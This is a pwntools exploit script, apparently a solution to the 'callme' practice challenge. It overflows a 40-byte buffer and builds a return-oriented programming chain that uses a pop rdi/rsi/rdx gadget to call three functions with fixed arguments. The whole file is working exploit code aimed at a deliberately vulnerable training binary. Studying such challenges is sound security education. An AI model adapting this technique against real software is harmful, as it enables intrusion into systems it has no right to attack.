from pwn import *

p = process("./callme")
elf = ELF("./callme")
rop = ROP("./callme")

padding = cyclic(40)
gadget = p64((rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]))[0]) # /R pop rdi in r2 and find a stub with pop rdi pop rsi pop rdx and ret
callme_1 = p64(elf.symbols['callme_one'])
callme_2 = p64(elf.symbols['callme_two'])
callme_3 = p64(elf.symbols['callme_three'])
arg_1 = p64(0xdeadbeefdeadbeef)
arg_2 = p64(0xcafebabecafebabe)
arg_3 = p64(0xd00df00dd00df00d)

def first_call(padding, gadget, callme_1):
    pld_1 = padding
    pld_1 += gadget
    pld_1 += arg_1
    pld_1 += arg_2
    pld_1 += arg_3
    pld_1 += callme_1
    return pld_1

def second_call(padding, gadget, callme_2): 
    pld_2 = gadget
    pld_2 += arg_1
    pld_2 += arg_2
    pld_2 += arg_3
    pld_2 += callme_2
    return pld_2

def third_call(padding, gadget, callme_3):
    pld_3 = gadget
    pld_3 += arg_1
    pld_3 += arg_2
    pld_3 += arg_3
    pld_3 += callme_3
    return pld_3

ropchain = first_call(padding, gadget, callme_1) 
ropchain += second_call(padding, gadget, callme_2)
ropchain += third_call(padding, gadget, callme_3)

p.sendline(ropchain)
p.interactive()
